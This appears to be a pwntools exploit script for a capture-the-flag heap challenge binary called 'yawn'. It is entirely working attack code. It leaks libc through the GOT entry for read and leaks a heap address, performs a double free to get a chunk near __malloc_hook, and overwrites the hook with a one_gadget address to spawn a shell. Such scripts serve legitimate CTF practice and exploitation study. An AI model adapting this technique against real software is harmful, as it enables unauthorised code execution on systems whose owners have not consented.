from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./yawn")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./yawn")
else:
	pass

def add(name,desc):
	p.sendlineafter(">> ","1")
	p.sendafter("name: ",name)
	p.sendlineafter("desc: ",desc)

def edit(index,name,size,desc):
	p.sendlineafter(">> ","2")
	p.sendafter("name: ",name)
	p.sendlineafter("size: ",str(size))
	p.sendafter("desc: ",desc)

def free(index):
	p.sendlineafter(">> ","3")
	p.sendlineafter("idx: ",str(index))

def show(index):
	p.sendlineafter(">> ","4")
	p.sendlineafter("idx: ",str(index))

def debugf():
	gdb.attach(p,"b *0x40103A")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
debugf()
# leak libc
add("a"*0x50,"s"*8 + p64(elf.got["read"]))
show(0)
p.recvuntil("Description : ")
read_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = read_addr - libc.symbols["read"]
log.success("libc_base:" + hex(libc.address))

# leak heap
bss_addr = 0x602040
add("a"*0x50,"s"*8 + p64(bss_addr))
show(1)
p.recvuntil("Description : ")
heap_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
heap_base = heap_addr - 0x1040
log.success("heap_base:"+hex(heap_base))
add("b"*0x50,"s"*8 + p64(heap_base + 0x11f0)) #2
add("a\n","s")
free(2)
free(3)
add(p64(libc.symbols["__malloc_hook"] - 0x23) + "\n","s")
add("a\n","s")
one_gadget = libc.address + 0xf02a4
payload = "aaa" + "a"*8*2 + p64(one_gadget) + "\n"
add("a\n","s")
add(payload,"s")
add("a\n","s")
p.interactive()
